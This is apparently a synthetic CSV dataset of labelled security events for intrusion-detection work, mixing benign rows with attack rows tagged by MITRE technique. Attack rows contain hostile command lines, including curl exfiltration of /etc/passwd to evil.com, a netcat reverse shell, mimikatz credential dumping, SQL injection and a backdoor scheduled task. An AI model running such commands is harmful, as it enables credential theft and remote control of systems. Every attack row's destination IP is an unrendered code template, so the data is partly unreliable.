@timestamp,label,attack_name,mitre_technique,mitre_tactic,event.category,event.outcome,source.ip,source.port,destination.ip,destination.port,network.bytes,network.packets,agent.hostname,agent.type,user.name,process.pid,process.name,process.command_line,file_name,domain
2026-09-10T11:09:07.563522,benign,,,,process,success,192.168.1.193,8443,10.0.1.229,22,4644,69,backup10,linux,sarah.jones,5780,explorer.exe,explorer.exe,,
2026-09-11T06:15:37.542678,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.2,60581,"10.0.0.{random.randint(1, 254)}",443,8997,47,backup100,linux,test,4125,python3,,,evil-c2.com
2026-09-11T15:08:12.568215,benign,,,,network,success,192.168.1.232,3072,10.0.4.135,443,8224,90,mail5,linux,mike.brown,2922,chrome.exe,explorer.exe,,
2026-09-13T15:07:10.554319,benign,,,,network,success,192.168.1.134,2048,10.0.2.220,53,6937,42,db3,linux,admin,5014,nginx,firefox.exe,,
2026-09-13T13:29:14.547841,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.3,26212,"10.0.0.{random.randint(1, 254)}",8080,14450,491,app10,windows,root,5051,cmd.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-15T11:18:35.551916,benign,,,,process,success,192.168.1.207,5000,10.0.5.76,80,4347,64,db50,linux,chris.miller,5542,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-15T05:44:27.557635,benign,,,,network,success,192.168.1.126,1024,10.0.5.50,3306,1786,57,app20,windows,david.moore,1668,explorer.exe,apache2 -DFOREGROUND,,
2026-09-10T03:15:03.546807,attack,credential_dump,T1003,credential_access,process,success,192.168.56.7,0,"10.0.0.{random.randint(1, 254)}",0,6390,10,web4,linux,guest,3876,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-09T12:19:15.561842,benign,,,,process,success,192.168.1.43,1024,10.0.0.200,22,6291,8,workstation50,linux,mark.wilson,8417,firefox.exe,explorer.exe,,
2026-09-11T08:48:13.548451,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.1,10409,"10.0.0.{random.randint(1, 254)}",53,28772,358,mail100,windows,test,5720,cmd.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-09T06:49:01.563369,benign,,,,network,success,192.168.1.101,4096,10.0.2.238,443,8339,71,workstation2,linux,mike.brown,8652,firefox.exe,explorer.exe,,
2026-09-09T05:16:26.552236,benign,,,,network,success,192.168.1.179,5000,10.0.1.54,53,3616,1,app20,windows,chris.miller,9441,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-10T08:47:03.540836,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.6,25914,"10.0.0.{random.randint(1, 254)}",8080,47422,408,db5,linux,admin,1259,powershell.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-12T17:45:39.567277,benign,,,,authentication,success,192.168.1.189,4096,10.0.5.153,3306,825,36,db3,windows,john.doe,850,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-08T19:46:12.558493,benign,,,,process,success,192.168.1.14,4096,10.0.0.1,80,8869,67,srv4,linux,chris.miller,1618,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-11T05:46:21.547289,attack,port_scan,T1046,discovery,network,success,192.168.56.7,30405,"10.0.0.{random.randint(1, 254)}",8080,4367,28,app50,linux,guest,9774,python3,,,
2026-09-09T01:09:03.557820,benign,,,,authentication,success,192.168.1.51,1024,10.0.3.86,443,1435,47,srv100,windows,john.doe,2988,systemd,apache2 -DFOREGROUND,,
2026-09-10T23:18:46.559416,benign,,,,network,success,192.168.1.129,2048,10.0.4.146,3306,3083,68,app50,linux,john.doe,7093,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-15T16:15:27.562548,benign,,,,network,success,192.168.1.34,5000,10.0.5.50,22,2483,63,db50,windows,admin,9902,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T02:42:57.559829,benign,,,,authentication,success,192.168.1.23,4096,10.0.0.46,443,8533,95,workstation5,windows,david.moore,5121,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-14T07:02:47.566953,benign,,,,network,success,192.168.1.87,5000,10.0.0.118,22,5952,99,mail2,windows,admin,4043,systemd,chrome.exe --profile-directory=Default,,
2026-09-15T16:23:37.560401,benign,,,,process,success,192.168.1.246,1024,10.0.2.34,53,9815,22,workstation20,windows,lisa.wilson,5810,chrome.exe,firefox.exe,,
2026-09-15T05:11:38.571398,benign,,,,network,success,192.168.1.138,1024,10.0.5.159,53,1102,63,web2,linux,emily.davis,4347,apache2,chrome.exe --profile-directory=Default,,
2026-09-11T10:54:27.562658,benign,,,,file,success,192.168.1.126,2048,10.0.2.217,22,2772,29,web20,linux,sarah.jones,3727,nginx,explorer.exe,,
2026-09-13T14:10:41.549540,benign,,,,authentication,success,192.168.1.122,4096,10.0.4.195,22,2560,83,srv3,linux,jane.smith,9126,apache2,chrome.exe --profile-directory=Default,,
2026-09-09T14:28:41.568352,benign,,,,authentication,success,192.168.1.249,1024,10.0.0.240,80,4186,49,backup100,windows,mike.brown,9354,sshd,chrome.exe --profile-directory=Default,,
2026-09-09T08:37:05.540191,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.9,62981,"10.0.0.{random.randint(1, 254)}",445,18520,474,web10,windows,root,9528,psexec.exe,,,
2026-09-13T21:09:14.549137,benign,,,,authentication,success,192.168.1.184,2048,10.0.2.120,53,8411,100,app1,linux,emily.davis,9167,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-09T18:52:30.567837,benign,,,,authentication,success,192.168.1.166,3072,10.0.1.209,443,6956,74,web3,windows,lisa.wilson,4240,sshd,apache2 -DFOREGROUND,,
2026-09-11T16:44:58.565975,benign,,,,authentication,success,192.168.1.202,8443,10.0.3.117,22,2659,15,web1,windows,david.moore,6359,sshd,explorer.exe,,
2026-09-12T17:53:32.547790,attack,credential_dump,T1003,credential_access,process,success,192.168.56.8,0,"10.0.0.{random.randint(1, 254)}",0,2727,9,db50,windows,root,9964,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-09T12:56:44.566489,benign,,,,network,success,192.168.1.92,5000,10.0.3.58,22,6598,17,app100,windows,mike.brown,6662,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-13T23:54:53.568759,benign,,,,authentication,success,192.168.1.202,5000,10.0.4.90,3306,8618,98,backup100,windows,john.doe,8376,systemd,apache2 -DFOREGROUND,,
2026-09-10T09:43:28.563323,benign,,,,authentication,success,192.168.1.23,3072,10.0.2.35,443,6626,71,srv20,windows,david.moore,9666,nginx,explorer.exe,,
2026-09-08T17:22:09.552118,benign,,,,authentication,success,192.168.1.248,1024,10.0.4.50,53,4452,72,web20,linux,mark.wilson,4838,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-08T22:05:10.553496,benign,,,,file,success,192.168.1.250,2048,10.0.5.118,53,1763,4,srv3,windows,jane.smith,1296,systemd,explorer.exe,,
2026-09-14T02:40:10.542467,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.1,5364,"10.0.0.{random.randint(1, 254)}",22,1158,1,web5,linux,test,2683,cmd.exe,,,
2026-09-12T00:08:16.571086,benign,,,,network,success,192.168.1.210,4096,10.0.0.223,3306,6828,23,db20,windows,emily.davis,9179,sshd,apache2 -DFOREGROUND,,
2026-09-13T19:04:38.546207,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.4,1534,"10.0.0.{random.randint(1, 254)}",53,31315,142,backup3,linux,guest,8074,bash,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-10T19:17:41.559057,benign,,,,file,success,192.168.1.35,2048,10.0.2.74,3306,1998,13,web20,linux,admin,1707,nginx,firefox.exe,,
2026-09-13T06:11:15.552925,benign,,,,authentication,success,192.168.1.231,1024,10.0.4.250,443,8588,77,backup3,windows,chris.miller,2839,sshd,explorer.exe,,
2026-09-10T02:16:55.544888,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.3,12330,"10.0.0.{random.randint(1, 254)}",445,34527,260,srv2,windows,guest,6548,psexec.exe,,,
2026-09-14T19:25:42.550639,benign,,,,network,success,192.168.1.86,1024,10.0.5.106,80,784,82,srv20,windows,mark.wilson,5507,chrome.exe,explorer.exe,,
2026-09-14T17:46:36.555807,benign,,,,file,success,192.168.1.68,4096,10.0.5.167,53,4215,29,web20,windows,mike.brown,4825,chrome.exe,explorer.exe,,
2026-09-11T16:29:42.548953,benign,,,,authentication,success,192.168.1.193,3072,10.0.3.191,443,4745,37,workstation3,linux,david.moore,8804,sshd,apache2 -DFOREGROUND,,
2026-09-15T01:03:58.565551,benign,,,,process,success,192.168.1.103,8443,10.0.1.216,22,5492,42,srv20,windows,mark.wilson,7854,chrome.exe,explorer.exe,,
2026-09-10T01:28:52.544877,attack,port_scan,T1046,discovery,network,success,192.168.56.6,26800,"10.0.0.{random.randint(1, 254)}",8080,4656,11,srv3,linux,test,7631,powershell.exe,,,
2026-09-12T18:46:53.549083,benign,,,,authentication,success,192.168.1.181,4096,10.0.1.4,80,8389,23,app1,linux,david.moore,2859,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-14T16:30:05.568628,benign,,,,authentication,success,192.168.1.162,4096,10.0.3.221,80,5994,92,workstation3,linux,admin,3081,systemd,firefox.exe,,
2026-09-14T18:32:44.550560,benign,,,,authentication,success,192.168.1.24,3072,10.0.5.127,53,5007,41,workstation3,windows,sarah.jones,3774,explorer.exe,explorer.exe,,
2026-09-09T14:14:15.567007,benign,,,,authentication,success,192.168.1.188,1024,10.0.1.115,443,8732,61,db3,linux,john.doe,5218,nginx,apache2 -DFOREGROUND,,
2026-09-15T13:52:22.542385,attack,webshell,T1505,persistence,file,success,192.168.56.3,0,"10.0.0.{random.randint(1, 254)}",0,5579,5,srv3,windows,administrator,4509,php,php /var/www/html/shell.php,shell.php,
2026-09-10T16:26:30.557777,benign,,,,file,success,192.168.1.249,1024,10.0.4.160,443,9760,70,srv1,windows,jane.smith,4240,chrome.exe,explorer.exe,,
2026-09-12T01:35:16.567374,benign,,,,process,success,192.168.1.89,3072,10.0.3.114,22,2125,22,workstation3,linux,jane.smith,2412,apache2,chrome.exe --profile-directory=Default,,
2026-09-13T06:38:27.569087,benign,,,,file,success,192.168.1.108,1024,10.0.5.248,80,7262,2,web4,linux,jane.smith,9800,systemd,chrome.exe --profile-directory=Default,,
2026-09-14T10:16:36.561687,benign,,,,file,success,192.168.1.19,2048,10.0.4.176,53,4342,75,workstation2,windows,admin,1530,nginx,chrome.exe --profile-directory=Default,,
2026-09-12T07:59:31.554259,benign,,,,process,success,192.168.1.193,4096,10.0.2.226,80,3703,84,workstation2,linux,david.moore,4075,apache2,explorer.exe,,
2026-09-10T01:25:53.550427,benign,,,,authentication,success,192.168.1.164,4096,10.0.3.90,80,6352,8,db4,linux,mark.wilson,2405,nginx,apache2 -DFOREGROUND,,
2026-09-12T20:58:57.556862,benign,,,,authentication,success,192.168.1.7,3072,10.0.4.192,22,6191,18,mail3,windows,jane.smith,8915,apache2,explorer.exe,,
2026-09-10T12:29:11.555031,benign,,,,authentication,success,192.168.1.89,8443,10.0.5.153,80,6951,27,web4,windows,sarah.jones,114,chrome.exe,explorer.exe,,
2026-09-09T12:18:30.554390,benign,,,,authentication,success,192.168.1.118,1024,10.0.2.76,80,682,69,backup20,linux,mike.brown,6999,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-13T23:41:07.545138,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.4,5807,"10.0.0.{random.randint(1, 254)}",53,98654,440,srv5,windows,test,6303,python3,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-09T05:33:06.562696,benign,,,,network,success,192.168.1.69,8443,10.0.2.227,3306,4136,50,web10,linux,mike.brown,8964,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-10T13:48:15.559592,benign,,,,network,success,192.168.1.187,3072,10.0.2.152,443,1275,97,srv2,windows,chris.miller,7347,nginx,explorer.exe,,
2026-09-09T05:22:55.543361,attack,credential_dump,T1003,credential_access,process,success,192.168.56.5,0,"10.0.0.{random.randint(1, 254)}",0,5461,1,db5,windows,admin,5627,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-15T02:37:23.546717,attack,sql_injection,T1190,initial_access,web,success,192.168.56.7,43031,"10.0.0.{random.randint(1, 254)}",80,1483,18,srv10,linux,guest,3409,bash,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-09T17:37:48.547003,attack,persistence,T1053,persistence,process,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,982,6,srv20,linux,test,1438,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-10T09:06:31.563491,benign,,,,authentication,success,192.168.1.234,3072,10.0.1.143,3306,904,52,mail20,windows,mike.brown,752,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-09T21:02:58.566563,benign,,,,authentication,success,192.168.1.162,5000,10.0.3.232,53,5823,25,srv10,windows,sarah.jones,7328,explorer.exe,firefox.exe,,
2026-09-08T19:33:05.540537,attack,persistence,T1053,persistence,process,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,399,8,workstation20,windows,test,3557,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-11T12:42:39.554609,benign,,,,network,success,192.168.1.17,8443,10.0.3.113,443,5529,73,mail50,linux,mark.wilson,1000,explorer.exe,firefox.exe,,
2026-09-13T00:56:47.544137,attack,webshell,T1505,persistence,file,success,192.168.56.1,0,"10.0.0.{random.randint(1, 254)}",0,3621,6,mail20,linux,guest,8807,php,php /var/www/html/shell.php,shell.php,
2026-09-11T22:37:38.543884,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.6,29540,"10.0.0.{random.randint(1, 254)}",445,2472,208,db20,linux,admin,648,psexec.exe,,,
2026-09-10T16:42:41.564864,benign,,,,authentication,success,192.168.1.137,3072,10.0.3.163,443,5438,17,app20,windows,john.doe,2248,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T04:51:06.567758,benign,,,,authentication,success,192.168.1.13,1024,10.0.3.1,80,4573,36,workstation4,windows,david.moore,1742,systemd,explorer.exe,,
2026-09-12T20:18:39.560471,benign,,,,authentication,success,192.168.1.110,8443,10.0.4.82,22,1772,48,app50,windows,sarah.jones,7033,chrome.exe,explorer.exe,,
2026-09-08T17:35:28.544453,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.5,42263,"10.0.0.{random.randint(1, 254)}",22,1612,17,backup1,linux,root,3029,python3,,,
2026-09-15T12:48:39.548344,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.3,28612,"10.0.0.{random.randint(1, 254)}",443,9668,48,mail3,linux,admin,6004,powershell.exe,,,evil-c2.com
2026-09-08T19:23:28.566454,benign,,,,network,success,192.168.1.245,3072,10.0.2.167,53,5182,14,db5,linux,jane.smith,1020,systemd,chrome.exe --profile-directory=Default,,
2026-09-11T16:55:19.554740,benign,,,,network,success,192.168.1.95,3072,10.0.2.105,80,8020,60,mail5,windows,mike.brown,9528,chrome.exe,explorer.exe,,
2026-09-13T06:39:08.561632,benign,,,,network,success,192.168.1.142,5000,10.0.4.97,3306,7406,93,app4,linux,mark.wilson,2609,nginx,apache2 -DFOREGROUND,,
2026-09-12T18:42:41.545148,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.3,36235,"10.0.0.{random.randint(1, 254)}",443,2381,19,mail20,linux,root,7971,cmd.exe,,,evil-c2.com
2026-09-08T22:07:06.544474,attack,webshell,T1505,persistence,file,success,192.168.56.2,0,"10.0.0.{random.randint(1, 254)}",0,5071,10,backup3,linux,root,277,php,php /var/www/html/shell.php,shell.php,
2026-09-14T07:31:12.549547,benign,,,,process,success,192.168.1.120,4096,10.0.3.201,80,2799,14,backup20,windows,mike.brown,9893,apache2,chrome.exe --profile-directory=Default,,
2026-09-12T06:35:19.540782,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.2,5092,"10.0.0.{random.randint(1, 254)}",443,256,52,mail20,linux,admin,8583,cmd.exe,,,evil-c2.com
2026-09-12T04:43:25.570367,benign,,,,network,success,192.168.1.184,4096,10.0.0.162,3306,352,62,db10,linux,chris.miller,9931,apache2,firefox.exe,,
2026-09-15T06:38:37.559188,benign,,,,process,success,192.168.1.146,3072,10.0.3.222,80,3114,28,app20,windows,sarah.jones,9037,sshd,chrome.exe --profile-directory=Default,,
2026-09-13T11:40:57.555002,benign,,,,authentication,success,192.168.1.233,5000,10.0.2.83,80,8713,52,mail2,linux,john.doe,9761,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-10T08:54:15.556269,benign,,,,authentication,success,192.168.1.22,8443,10.0.1.219,3306,7152,84,web3,windows,jane.smith,4913,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T12:08:23.548531,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.3,23119,"10.0.0.{random.randint(1, 254)}",445,21934,170,backup2,windows,root,5534,psexec.exe,,,
2026-09-10T19:42:17.557903,benign,,,,network,success,192.168.1.129,3072,10.0.2.20,443,1860,53,workstation20,linux,emily.davis,4631,chrome.exe,apache2 -DFOREGROUND,,
2026-09-13T13:15:08.553106,benign,,,,authentication,success,192.168.1.76,3072,10.0.5.25,443,6131,16,web3,linux,mark.wilson,2482,explorer.exe,apache2 -DFOREGROUND,,
2026-09-12T17:06:31.544295,attack,sql_injection,T1190,initial_access,web,success,192.168.56.6,39862,"10.0.0.{random.randint(1, 254)}",80,902,12,mail50,windows,root,9195,bash,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-13T09:36:33.569966,benign,,,,authentication,success,192.168.1.64,8443,10.0.2.62,3306,5887,33,srv20,windows,mark.wilson,9338,apache2,apache2 -DFOREGROUND,,
2026-09-15T13:23:11.555231,benign,,,,authentication,success,192.168.1.25,4096,10.0.0.251,80,2904,98,web3,linux,david.moore,8839,explorer.exe,apache2 -DFOREGROUND,,
2026-09-12T14:02:57.553762,benign,,,,authentication,success,192.168.1.75,2048,10.0.3.105,80,7802,77,mail20,linux,mark.wilson,6900,explorer.exe,firefox.exe,,
2026-09-14T01:52:22.551577,benign,,,,process,success,192.168.1.215,2048,10.0.1.208,443,5282,46,app5,linux,jane.smith,3029,chrome.exe,explorer.exe,,
2026-09-12T13:18:58.550196,benign,,,,network,success,192.168.1.35,4096,10.0.5.69,22,1711,43,web20,windows,john.doe,9694,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T13:47:53.569883,benign,,,,process,success,192.168.1.218,8443,10.0.3.38,80,1162,53,web3,linux,john.doe,480,sshd,firefox.exe,,
2026-09-11T01:00:02.567538,benign,,,,authentication,success,192.168.1.44,3072,10.0.0.117,53,9504,14,backup4,windows,chris.miller,7601,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-15T06:03:01.561614,benign,,,,process,success,192.168.1.115,5000,10.0.2.17,22,719,92,app1,linux,jane.smith,5524,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T12:13:37.546449,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.5,49735,"10.0.0.{random.randint(1, 254)}",443,2974,97,backup3,linux,administrator,7875,bash,,,evil-c2.com
2026-09-09T12:51:11.560635,benign,,,,file,success,192.168.1.132,1024,10.0.3.196,53,5833,19,db100,linux,mike.brown,792,firefox.exe,explorer.exe,,
2026-09-14T09:44:51.565456,benign,,,,process,success,192.168.1.51,1024,10.0.4.129,3306,5420,67,backup1,windows,emily.davis,2590,firefox.exe,explorer.exe,,
2026-09-10T08:06:14.568138,benign,,,,file,success,192.168.1.214,5000,10.0.4.163,22,1846,54,db50,linux,emily.davis,6875,explorer.exe,apache2 -DFOREGROUND,,
2026-09-10T01:25:33.566222,benign,,,,network,success,192.168.1.43,5000,10.0.4.63,53,7034,91,workstation20,windows,emily.davis,4208,chrome.exe,apache2 -DFOREGROUND,,
2026-09-09T05:48:37.542191,attack,webshell,T1505,persistence,file,success,192.168.56.2,0,"10.0.0.{random.randint(1, 254)}",0,747,1,app100,linux,administrator,7064,php,php /var/www/html/shell.php,shell.php,
2026-09-15T06:33:59.546854,attack,sql_injection,T1190,initial_access,web,success,192.168.56.1,7480,"10.0.0.{random.randint(1, 254)}",80,4462,10,db5,linux,administrator,4122,powershell.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-13T22:06:29.565302,benign,,,,network,success,192.168.1.38,1024,10.0.3.129,80,9973,74,backup2,linux,jane.smith,5897,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-14T04:48:48.548721,benign,,,,authentication,success,192.168.1.197,4096,10.0.0.47,53,7421,95,workstation10,linux,emily.davis,4406,sshd,apache2 -DFOREGROUND,,
2026-09-14T19:03:05.569364,benign,,,,network,success,192.168.1.70,4096,10.0.5.99,22,733,63,srv20,linux,david.moore,1122,nginx,chrome.exe --profile-directory=Default,,
2026-09-10T17:30:55.543489,attack,credential_dump,T1003,credential_access,process,success,192.168.56.3,0,"10.0.0.{random.randint(1, 254)}",0,6108,6,web100,linux,root,8004,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-15T11:24:06.551748,benign,,,,network,success,192.168.1.30,3072,10.0.2.38,80,4555,91,backup20,linux,emily.davis,211,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-14T14:08:19.540693,attack,credential_dump,T1003,credential_access,process,success,192.168.56.7,0,"10.0.0.{random.randint(1, 254)}",0,9732,1,backup100,windows,guest,8241,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-15T07:28:27.548204,attack,port_scan,T1046,discovery,network,success,192.168.56.7,61547,"10.0.0.{random.randint(1, 254)}",445,3842,42,db1,windows,administrator,4930,cmd.exe,,,
2026-09-09T19:50:55.563182,benign,,,,authentication,success,192.168.1.109,4096,10.0.3.170,3306,8849,3,mail4,windows,john.doe,7126,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-15T10:09:59.567884,benign,,,,authentication,success,192.168.1.212,5000,10.0.4.17,80,7380,25,srv5,windows,lisa.wilson,6147,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-09T10:39:06.557019,benign,,,,file,success,192.168.1.197,8443,10.0.1.150,80,5052,9,web2,linux,admin,8241,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-15T13:18:04.571153,benign,,,,authentication,success,192.168.1.22,2048,10.0.4.221,3306,2214,47,db5,linux,emily.davis,3288,systemd,chrome.exe --profile-directory=Default,,
2026-09-11T02:41:27.550861,benign,,,,network,success,192.168.1.11,3072,10.0.2.76,80,5342,56,srv1,windows,mike.brown,1960,firefox.exe,explorer.exe,,
2026-09-11T22:20:05.540990,attack,reverse_shell,T1059,execution,process,success,192.168.56.2,41517,"10.0.0.{random.randint(1, 254)}",4444,1500,2,workstation4,linux,root,7294,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-13T01:55:29.541244,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.8,20952,"10.0.0.{random.randint(1, 254)}",443,2103,38,workstation100,windows,test,8833,python3,,,evil-c2.com
2026-09-12T09:10:15.557926,benign,,,,authentication,success,192.168.1.213,5000,10.0.4.18,53,7162,41,app50,linux,chris.miller,1921,firefox.exe,explorer.exe,,
2026-09-08T22:44:14.568109,benign,,,,authentication,success,192.168.1.237,3072,10.0.3.160,3306,9072,62,srv20,linux,mike.brown,7860,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-14T16:45:56.566448,benign,,,,process,success,192.168.1.152,1024,10.0.5.176,22,576,84,mail5,linux,chris.miller,2399,chrome.exe,explorer.exe,,
2026-09-09T07:18:03.555572,benign,,,,process,success,192.168.1.212,1024,10.0.5.60,22,9837,100,backup50,linux,emily.davis,2852,nginx,explorer.exe,,
2026-09-10T19:21:11.550836,benign,,,,network,success,192.168.1.30,1024,10.0.4.62,53,6677,38,web1,windows,lisa.wilson,3929,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-12T16:36:19.552578,benign,,,,authentication,success,192.168.1.227,5000,10.0.3.233,53,5537,49,backup4,windows,david.moore,4914,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-12T17:53:41.564962,benign,,,,network,success,192.168.1.58,5000,10.0.0.227,53,2005,79,srv50,linux,john.doe,6359,sshd,apache2 -DFOREGROUND,,
2026-09-14T13:00:09.554644,benign,,,,authentication,success,192.168.1.223,1024,10.0.0.146,53,4187,82,app10,linux,sarah.jones,3202,explorer.exe,firefox.exe,,
2026-09-09T05:55:32.543629,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.10,3838,"10.0.0.{random.randint(1, 254)}",443,4689,67,workstation10,linux,administrator,9196,cmd.exe,,,evil-c2.com
2026-09-12T04:18:48.556257,benign,,,,file,success,192.168.1.199,2048,10.0.2.143,53,672,3,web4,windows,sarah.jones,2047,sshd,chrome.exe --profile-directory=Default,,
2026-09-10T12:35:53.540409,attack,persistence,T1053,persistence,process,success,192.168.56.7,0,"10.0.0.{random.randint(1, 254)}",0,677,7,app5,windows,admin,1531,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-09T19:49:04.543916,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.8,39124,"10.0.0.{random.randint(1, 254)}",445,39299,147,workstation20,linux,guest,5996,psexec.exe,,,
2026-09-15T08:51:01.571303,benign,,,,network,success,192.168.1.254,1024,10.0.5.96,53,4180,69,mail10,windows,sarah.jones,6857,sshd,firefox.exe,,
2026-09-12T17:06:01.560506,benign,,,,process,success,192.168.1.59,4096,10.0.2.203,53,366,51,backup10,linux,admin,131,nginx,firefox.exe,,
2026-09-13T12:51:40.564250,benign,,,,network,success,192.168.1.100,3072,10.0.3.150,443,4613,9,srv20,linux,david.moore,9140,systemd,chrome.exe --profile-directory=Default,,
2026-09-14T00:41:09.541216,attack,port_scan,T1046,discovery,network,success,192.168.56.7,28173,"10.0.0.{random.randint(1, 254)}",445,3267,48,backup1,windows,admin,2201,cmd.exe,,,
2026-09-11T15:08:59.549337,benign,,,,process,success,192.168.1.6,4096,10.0.4.159,22,7455,75,app10,linux,lisa.wilson,3625,firefox.exe,explorer.exe,,
2026-09-10T01:33:39.542718,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.1,26168,"10.0.0.{random.randint(1, 254)}",445,6267,77,workstation5,linux,administrator,1039,psexec.exe,,,
2026-09-14T14:45:18.542107,attack,webshell,T1505,persistence,file,success,192.168.56.1,0,"10.0.0.{random.randint(1, 254)}",0,5903,4,backup50,linux,guest,6883,php,php /var/www/html/shell.php,shell.php,
2026-09-14T17:24:02.559181,benign,,,,network,success,192.168.1.148,5000,10.0.3.37,80,536,48,backup2,windows,jane.smith,8140,explorer.exe,explorer.exe,,
2026-09-13T11:15:55.548340,attack,persistence,T1053,persistence,process,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,367,4,web100,linux,root,3120,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-10T15:34:07.542168,attack,webshell,T1505,persistence,file,success,192.168.56.2,0,"10.0.0.{random.randint(1, 254)}",0,5473,4,mail10,windows,administrator,9792,php,php /var/www/html/shell.php,shell.php,
2026-09-15T09:01:17.559866,benign,,,,authentication,success,192.168.1.49,2048,10.0.3.76,53,9786,14,web3,windows,chris.miller,1919,nginx,apache2 -DFOREGROUND,,
2026-09-09T07:42:58.568771,benign,,,,authentication,success,192.168.1.28,5000,10.0.3.176,22,6476,35,workstation10,linux,admin,7010,nginx,firefox.exe,,
